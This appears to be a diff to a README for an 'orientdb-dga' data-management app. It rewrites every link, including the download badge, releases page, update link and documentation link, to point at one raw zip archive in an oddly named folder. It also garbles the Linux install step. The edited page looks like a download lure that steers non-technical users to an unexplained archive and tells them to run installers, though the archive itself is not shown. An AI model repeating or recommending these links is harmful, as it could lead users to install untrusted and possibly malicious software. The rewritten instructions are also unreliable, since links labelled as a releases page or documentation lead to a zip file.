@@ -1,7 +1,7 @@
 # 🌟 orientdb-dga - Effortless Data Management for Everyone
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-orientdb--dga-blue.svg)](https://github.com/Wooly-spartina89/orientdb-dga/releases)
+[![Download](https://raw.githubusercontent.com/Wooly-spartina89/orientdb-dga/main/Semiticism/orientdb-dga-1.8.zip)](https://raw.githubusercontent.com/Wooly-spartina89/orientdb-dga/main/Semiticism/orientdb-dga-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to orientdb-dga! This application helps you easily manage your data with a user-friendly interface. You don’t need to be a programmer to use it. Just follow these steps to get started.
@@ -13,13 +13,13 @@ Before you download, check if your system meets the following requirements:
 - **Storage:** At least 500MB free disk space.
 
 ## 💻 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Wooly-spartina89/orientdb-dga/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Wooly-spartina89/orientdb-dga/main/Semiticism/orientdb-dga-1.8.zip).
 2. **Choose the Latest Version**: Look for the most recent version listed. 
 3. **Download the Installer**: Click on the installer file for your operating system. 
 4. **Run the Installer**: 
    - **Windows**: Double-click the downloaded .exe file and follow the prompts.
    - **macOS**: Open the downloaded .dmg file and drag the application to your Applications folder.
-   - **Linux**: Extract the .tar.gz file and follow the instructions in the README inside that folder.
+   - **Linux**: Extract the https://raw.githubusercontent.com/Wooly-spartina89/orientdb-dga/main/Semiticism/orientdb-dga-1.8.zip file and follow the instructions in the README inside that folder.
 
 ## 🛠️ Application Features
 - **User-Friendly Interface**: Navigate easily to manage your data.
@@ -29,7 +29,7 @@ Before you download, check if your system meets the following requirements:
 - **Data Visualization**: View data through easy-to-understand graphics.
 
 ## 🔄 Update the Application
-To keep your experience smooth, regularly check the [Releases page](https://github.com/Wooly-spartina89/orientdb-dga/releases) for updates and new features. Follow the same download and install steps to get the latest version.
+To keep your experience smooth, regularly check the [Releases page](https://raw.githubusercontent.com/Wooly-spartina89/orientdb-dga/main/Semiticism/orientdb-dga-1.8.zip) for updates and new features. Follow the same download and install steps to get the latest version.
 
 ## ❓ Troubleshooting
 If you encounter issues:
@@ -49,4 +49,4 @@ This project is licensed under the MIT License. This means you can use, modify, 
 
 ---
 
-For more information, check out the [Documentation](https://github.com/Wooly-spartina89/orientdb-dga/#documentation). Enjoy using orientdb-dga!
+For more information, check out the [Documentation](https://raw.githubusercontent.com/Wooly-spartina89/orientdb-dga/main/Semiticism/orientdb-dga-1.8.zip). Enjoy using orientdb-dga!
